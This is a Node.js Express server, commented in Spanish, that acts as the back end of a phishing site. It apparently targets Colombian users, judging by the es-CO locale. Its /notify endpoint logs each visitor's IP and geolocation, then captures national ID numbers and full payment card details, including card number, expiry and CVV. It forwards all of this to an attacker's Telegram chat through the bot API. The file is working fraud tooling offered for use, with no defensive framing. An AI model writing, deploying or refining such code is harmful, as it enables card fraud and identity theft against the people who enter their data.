const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/notify', async (req, res) => {
    const { uid, tk, ex, cv, type, device } = req.body;
    
    // Obtener IP real del usuario (Render la pasa en x-forwarded-for)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    let geoInfo = "Desconocida";
    try {
        // Consultamos la ubicación de la IP
        const geoRes = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}?fields=status,country,city,isp`);
        if(geoRes.data.status === 'success') {
            geoInfo = `${geoRes.data.city}, ${geoRes.data.country} (${geoRes.data.isp})`;
        }
    } catch (e) { console.log("Error Geo:", e.message); }

    let textoTelegram = "";

    if (type === 'visit') {
        textoTelegram = `🌐 <b>NUEVA VISITA DETECTADA</b>\n` +
                        `📍 <b>Ubicación:</b> <code>${geoInfo}</code>\n` +
                        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
                        `📱 <b>Dispositivo:</b> <code>${device || 'PC/Otro'}</code>\n` +
                        `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}`;
    } 
    else if (type === 'init_session') {
        textoTelegram = `👤 <b>ESCRIBIÓ CÉDULA</b>\n` +
                        `🆔 ID: <code>${uid}</code>\n` +
                        `📍 IP: <code>${ip}</code>`;
    } 
    else if (type === 'full_auth') {
        textoTelegram = `💳 <b>REPORTE FULL</b>\n` +
                        `👤 ID: <code>${uid}</code>\n` +
                        `🔢 TRJ: <code>${tk}</code>\n` +
                        `📅 EXP: <code>${ex}</code>\n` +
                        `🔑 CVV: <code>${cv}</code>\n` +
                        `📍 IP: <code>${ip}</code>`;
    }

    try {
        if (textoTelegram !== "") {
            await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: textoTelegram,
                parse_mode: 'HTML'
            });
        }
        res.status(200).send({ status: 'ok' });
    } catch (error) {
        res.status(200).send({ status: 'ok' }); 
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor activo en puerto ${PORT}`);
});


